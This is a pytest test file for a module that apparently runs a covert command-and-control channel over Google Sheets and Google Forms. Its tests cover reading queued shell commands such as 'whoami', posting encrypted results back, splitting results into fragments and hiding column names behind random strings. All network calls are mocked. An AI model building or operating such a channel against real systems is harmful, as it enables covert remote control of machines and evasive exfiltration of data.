import io
import csv
import json
from unittest.mock import patch, MagicMock

import pytest
from cryptography.fernet import Fernet


def make_sheet_response(rows):
    """Build a mock requests.Response that looks like a Google Sheets CSV export."""
    if not rows:
        text = ""
    else:
        buf = io.StringIO()
        writer = csv.DictWriter(buf, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
        text = buf.getvalue()
    m = MagicMock()
    m.text = text
    m.raise_for_status = lambda: None
    return m


# ---------------------------------------------------------------------------
# read_tab
# ---------------------------------------------------------------------------

class TestReadTab:
    def test_parses_csv_to_list_of_dicts(self):
        rows = [{"a": "1", "b": "2"}, {"a": "3", "b": "4"}]
        with patch("requests.get", return_value=make_sheet_response(rows)):
            from common import read_tab
            assert read_tab("123") == rows

    def test_empty_sheet_returns_empty_list(self):
        with patch("requests.get", return_value=make_sheet_response([])):
            from common import read_tab
            assert read_tab("123") == []


# ---------------------------------------------------------------------------
# read_inbox
# ---------------------------------------------------------------------------

class TestReadInbox:
    def test_returns_normal_rows(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_METHOD", "plaintext")
        rows = [{"command_id": "abc", "command": "shell", "payload": '{"cmd":"whoami"}',
                 "target": "", "status": "pending", "created_at": "t"}]
        with patch("requests.get", return_value=make_sheet_response(rows)):
            from common import read_inbox
            result = read_inbox()
        assert len(result) == 1
        assert result[0]["command_id"] == "abc"
        assert result[0]["status"] == "pending"

    def test_reassembles_fragments(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_METHOD", "plaintext")
        rows = [
            {"command_id": "abc", "command": "shell", "payload": '{"cmd":"wh',
             "target": "", "status": "frag:0:2", "created_at": "t"},
            {"command_id": "abc", "command": "shell", "payload": 'oami"}',
             "target": "", "status": "frag:1:2", "created_at": "t"},
        ]
        with patch("requests.get", return_value=make_sheet_response(rows)):
            from common import read_inbox
            result = read_inbox()
        assert len(result) == 1
        assert result[0]["payload"] == '{"cmd":"whoami"}'
        assert result[0]["status"] == "pending"

    def test_column_obfuscation_translated(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_METHOD", "plaintext")
        monkeypatch.setenv("INBOX_COLUMN_MAP", json.dumps({
            "command_id": "f3a7k", "command": "x9m2p", "payload": "b4r8w",
            "target": "d1n5q", "status": "h6v3j", "created_at": "k2y9t",
        }))
        rows = [{"f3a7k": "abc", "x9m2p": "echo", "b4r8w": '{"msg":"hi"}',
                 "d1n5q": "", "h6v3j": "pending", "k2y9t": "t"}]
        with patch("requests.get", return_value=make_sheet_response(rows)):
            from common import read_inbox
            result = read_inbox()
        assert result[0]["command_id"] == "abc"
        assert result[0]["command"] == "echo"
        assert result[0]["payload"] == '{"msg":"hi"}'


# ---------------------------------------------------------------------------
# read_outbox
# ---------------------------------------------------------------------------

class TestReadOutbox:
    def test_returns_result_rows(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_METHOD", "plaintext")
        rows = [{"command_id": "abc", "client_id": "w1", "status": "success",
                 "result": '{"stdout":"root"}', "timestamp": "t"}]
        with patch("requests.get", return_value=make_sheet_response(rows)):
            from common import read_outbox
            result = read_outbox()
        assert result[0]["result"] == '{"stdout":"root"}'

    def test_reassembles_out_of_order_fragments(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_METHOD", "plaintext")
        rows = [
            {"command_id": "abc", "client_id": "w1", "status": "frag:1:2", "result": "world",  "timestamp": "t"},
            {"command_id": "abc", "client_id": "w1", "status": "frag:0:2", "result": "hello ", "timestamp": "t"},
        ]
        with patch("requests.get", return_value=make_sheet_response(rows)):
            from common import read_outbox
            result = read_outbox()
        assert len(result) == 1
        assert result[0]["result"] == "hello world"

    def test_fernet_encrypted_values_decrypted(self, monkeypatch):
        key = Fernet.generate_key().decode()
        monkeypatch.setenv("ENCRYPTION_METHOD", "fernet")
        monkeypatch.setenv("ENCRYPTION_KEY", key)
        from crypto.fernet import FernetEncryptor
        from common import _encrypt_row
        enc = FernetEncryptor()
        plain = {"command_id": "abc", "client_id": "w1", "status": "success",
                 "result": "plaintext secret", "timestamp": "t"}
        encrypted = _encrypt_row(plain, enc)
        with patch("requests.get", return_value=make_sheet_response([encrypted])):
            from common import read_outbox
            result = read_outbox()
        assert result[0]["result"] == "plaintext secret"
        assert result[0]["command_id"] == "abc"


# ---------------------------------------------------------------------------
# write_form
# ---------------------------------------------------------------------------

class TestWriteForm:
    def test_posts_to_correct_url(self):
        m = MagicMock()
        m.ok = True
        with patch("requests.post", return_value=m) as mock_post:
            from common import write_form
            write_form({"command_id": "abc", "client_id": "w1",
                        "status": "success", "result": "ok", "timestamp": "t"})
        assert "formResponse" in mock_post.call_args[0][0]

    def test_maps_logical_fields_to_entry_ids(self):
        m = MagicMock()
        m.ok = True
        with patch("requests.post", return_value=m) as mock_post:
            from common import write_form
            write_form({"command_id": "abc", "client_id": "w1",
                        "status": "success", "result": "ok", "timestamp": "t"})
        payload = mock_post.call_args[1]["data"]
        assert payload["entry.1"] == "abc"   # command_id
        assert payload["entry.2"] == "w1"    # client_id
        assert payload["entry.4"] == "ok"    # result

    def test_fernet_write_sends_ciphertext(self, monkeypatch):
        key = Fernet.generate_key().decode()
        monkeypatch.setenv("ENCRYPTION_METHOD", "fernet")
        monkeypatch.setenv("ENCRYPTION_KEY", key)
        m = MagicMock()
        m.ok = True
        with patch("requests.post", return_value=m) as mock_post:
            from common import write_form
            write_form({"command_id": "abc", "client_id": "w1",
                        "status": "success", "result": "secret data", "timestamp": "t"})
        payload = mock_post.call_args[1]["data"]
        assert payload["entry.4"] != "secret data"   # result field encrypted
        assert payload["entry.1"] != "abc"            # command_id encrypted too

    def test_returns_true_on_success(self):
        m = MagicMock()
        m.ok = True
        with patch("requests.post", return_value=m):
            from common import write_form
            assert write_form({"command_id": "x", "client_id": "y",
                                "status": "s", "result": "r", "timestamp": "t"}) is True

    def test_returns_true_on_redirect(self):
        m = MagicMock()
        m.ok = False
        m.status_code = 302
        with patch("requests.post", return_value=m):
            from common import write_form
            assert write_form({"command_id": "x", "client_id": "y",
                                "status": "s", "result": "r", "timestamp": "t"}) is True

    def test_returns_false_on_error(self):
        m = MagicMock()
        m.ok = False
        m.status_code = 500
        with patch("requests.post", return_value=m):
            from common import write_form
            assert write_form({"command_id": "x", "client_id": "y",
                                "status": "s", "result": "r", "timestamp": "t"}) is False


# ---------------------------------------------------------------------------
# Full fragment roundtrip (write → CSV → read → reassemble)
# ---------------------------------------------------------------------------

class TestFragmentRoundtrip:
    def test_plaintext_fragment_roundtrip(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_METHOD", "plaintext")
        monkeypatch.setenv("FRAGMENT_METHOD", "fixed")
        monkeypatch.setenv("FRAGMENT_CHUNK_SIZE", "20")

        original = "A" * 100
        data = {"command_id": "abc", "client_id": "w1", "status": "success",
                "result": original, "timestamp": "t"}

        from common import get_fragmenter, build_outbox_fragments
        chunks = get_fragmenter().fragment(original)
        frag_rows = build_outbox_fragments(data, chunks)

        with patch("requests.get", return_value=make_sheet_response(frag_rows)):
            from common import read_outbox
            result = read_outbox()

        assert len(result) == 1
        assert result[0]["result"] == original

    def test_fernet_fragment_roundtrip(self, monkeypatch):
        key = Fernet.generate_key().decode()
        monkeypatch.setenv("ENCRYPTION_METHOD", "fernet")
        monkeypatch.setenv("ENCRYPTION_KEY", key)
        monkeypatch.setenv("FRAGMENT_METHOD", "fixed")
        monkeypatch.setenv("FRAGMENT_CHUNK_SIZE", "50")

        original = "secret data " * 20   # 240 chars → multiple fragments
        data = {"command_id": "abc", "client_id": "w1", "status": "success",
                "result": original, "timestamp": "t"}

        from common import get_fragmenter, build_outbox_fragments, _encrypt_row, get_encryptor
        enc = get_encryptor()
        chunks = get_fragmenter().fragment(original)
        frag_rows = [_encrypt_row(row, enc) for row in build_outbox_fragments(data, chunks)]

        with patch("requests.get", return_value=make_sheet_response(frag_rows)):
            from common import read_outbox
            result = read_outbox()

        assert len(result) == 1
        assert result[0]["result"] == original
